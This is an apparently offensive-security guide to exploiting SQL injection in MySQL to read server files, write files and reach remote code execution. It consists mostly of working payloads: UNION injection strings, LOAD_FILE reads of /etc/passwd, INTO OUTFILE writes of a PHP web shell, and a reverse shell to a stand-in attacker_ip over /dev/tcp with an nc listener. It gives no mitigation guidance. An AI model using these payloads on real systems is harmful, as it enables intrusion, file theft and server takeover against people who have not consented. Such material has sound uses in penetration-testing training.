# ✍️ File Reading and Writing in MySQL

SQL injection vulnerabilities in `MySQL` databases can be exploited to read files, write files, and even escalate to Remote Code Execution (RCE) under the right conditions. This guide demonstrates how attackers can manipulate SQL queries to perform these actions.

### Reading Files with SQL Injection

To read files on a `MySQL` server, the database user needs to have the `FILE` privilege. This privilege allows the user to load files from the system into the database. Here’s how attackers can exploit this using SQL injection.

#### Step 1: Identify the Database User

Attackers often start by identifying the database user executing the SQL queries. Using SQL injection, the current user can be retrieved like this:

```sql
admin' UNION SELECT 1, user(), 3, 4-- -
```

In the terminal, the injection would look like this:

```bash
babel@target:/var/www$ curl http://target.com/page.php?id=1' UNION SELECT 1, user(), 3, 4-- -
```

Alternatively, attackers might check the `mysql.user` table to find other users:

```sql
admin' UNION SELECT 1, user, host, 4 FROM mysql.user-- -
```

This helps the attacker understand which users exist and where they are connecting from.

#### Step 2: Check User Privileges

Once the user is identified, the next step is to verify their privileges to determine if they can read files. This can be done by querying the `user_privileges` table:

```sql
admin' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```

To see if the user has superuser privileges, the following query can be used:

```sql
admin' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user='target_user'-- -
```

If the result returns `'Y'`, the user has superuser privileges, and the attacker can attempt to read system files using the `LOAD_FILE()` function.

#### Step 3: Read Files Using `LOAD_FILE()`

With sufficient privileges, attackers can use the `LOAD_FILE()` function to read sensitive files. For example:

```sql
SELECT LOAD_FILE('/etc/passwd');
```

In a SQL injection scenario, it could look like this:

```sql
admin' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4-- -
```

In the terminal:

```bash
babel@target:/var/www$ curl http://target.com/page.php?id=1' UNION SELECT 1, LOAD_FILE('/etc/passwd'), 3, 4-- -
```

If the database user has `FILE` privileges, the attacker can read sensitive system files such as `/etc/passwd` or web application configuration files like `config.php`.

#### Example Output:

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```

### Writing Files with SQL Injection

Writing files on the server via SQL injection requires specific conditions:

1. The user must have the `FILE` privilege.
2. The `secure_file_priv` variable must not restrict file writing.
3. The directory to which files are written must be writable by the MySQL process.

#### Step 1: Check `secure_file_priv`

The `secure_file_priv` setting controls where files can be read from or written to. To check this setting, the following query can be used:

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```

Using SQL injection, it can be done like this:

```sql
admin' UNION SELECT 1, @@secure_file_priv, 3, 4-- -
```

If the variable returns an empty value, it means there are no restrictions on where files can be written.

#### Step 2: Write Files Using `SELECT INTO OUTFILE`

With the correct privileges and no `secure_file_priv` restrictions, the attacker can use the `SELECT INTO OUTFILE` command to write files. For example, writing a simple PHP web shell:

```sql
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
```

In a SQL injection:

```sql
admin' UNION SELECT 1, '<?php system($_GET["cmd"]); ?>', 3, 4 INTO OUTFILE '/var/www/html/shell.php'-- -
```

#### Example PHP Web Shell

The attacker can then access the shell like this:

```html
http://target.com/shell.php?cmd=whoami
```

This would execute the `whoami` command and return the user under which the web server is running.

#### Step 3: Example of a Reverse Shell

An attacker could also inject a reverse shell, which would give them remote access to the system:

```sql
admin' UNION SELECT 1, '<?php exec("/bin/bash -i >& /dev/tcp/attacker_ip/4444 0>&1"); ?>', 3, 4 INTO OUTFILE '/var/www/html/revshell.php'-- -
```

Then, they could set up a listener on their own machine:

```bash
babel@attacker:~$ nc -lvnp 4444
```

And execute the shell by accessing:

```html
http://target.com/revshell.php
```

#### Example Output:

Once the shell is triggered, the attacker's listener may show something like:

```bash
babel@attacker:~$ nc -lvnp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from target.com 192.168.1.100 received!
bash: no job control in this shell
bash-4.2$ whoami
www-data
```

### Obtaining Remote Code Execution (RCE)

An attacker can escalate a SQL injection into Remote Code Execution (RCE) if they can write executable scripts to the web directory. Writing a PHP web shell, as shown earlier, allows them to run commands directly on the server.

For example:

```sql
admin' UNION SELECT 1, '<?php system($_GET["cmd"]); ?>', 3, 4 INTO OUTFILE '/var/www/html/webshell.php'-- -
```

Once written, the attacker can execute commands by passing them as parameters:

```html
http://target.com/webshell.php?cmd=id
```

#### Example Command Output:

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
